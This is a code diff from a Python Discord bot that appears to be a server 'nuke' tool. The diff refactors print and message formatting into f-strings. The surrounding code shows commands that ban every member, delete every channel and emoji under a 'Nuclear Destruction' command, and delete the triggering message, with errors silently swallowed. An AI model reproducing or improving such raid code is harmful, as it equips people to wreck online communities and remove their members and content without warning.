@@ -68,7 +68,7 @@ async def ball(ctx):
     for member in list(client.get_all_members()):
         try:
             await guild.ban(member)
-            print ("User " + member.name + " has been banned")
+            print(f"User {member.name} has been banned")
         except:
             pass
     print ("Action completed: Ban all")
@@ -151,7 +151,7 @@ async def destroy(ctx):
     for channel in list(ctx.message.guild.channels):
         try:
             await channel.delete()
-            print (channel.name + " has been deleted")
+            print(f"{channel.name} has been deleted")
         except:
             pass
         guild = ctx.message.guild
@@ -167,7 +167,7 @@ async def destroy(ctx):
     for member in list(client.get_all_members()):
         try:
             await guild.ban(member)
-            print ("User " + member.name + " has been banned")
+            print(f"User {member.name} has been banned")
         except:
             pass
     for emoji in list(ctx.guild.emojis):
@@ -175,7 +175,7 @@ async def destroy(ctx):
             await emoji.delete()
             print (f"{emoji.name} has been deleted")
         except:
-            pass    
+            pass
     print("Action completed: Nuclear Destruction")
 #############################
 
@@ -189,7 +189,11 @@ async def ping(ctx):
     t1 = time.perf_counter()
     await channel.trigger_typing()
     t2 = time.perf_counter()
-    embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
+    embed = discord.Embed(
+        title=None,
+        description=f'Ping: {round((t2 - t1) * 1000)}',
+        color=0x2874A6,
+    )
     await member.send(embed=embed)
     print("Action completed: Server ping")
 #############################
@@ -200,10 +204,14 @@ async def info(ctx, member: discord.Member=None):
     await ctx.message.delete()
     member = ctx.message.author
     channel = ctx.message.channel
-    if member is None:
-        pass
-    else:
-        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
+    if member is not None:
+        await channel.send(
+            f"**The user's name is: {member.name}**"
+            + f"\n**The user's ID is: {member.id}**"
+            + f"\n**The user's current status is: {member.status}**"
+            + f"\n**The user's highest role is: {member.top_role}**"
+            + f"\n**The user joined at: {member.joined_at}**"
+        )
     print("Action completed: User Info")
 #############################
 
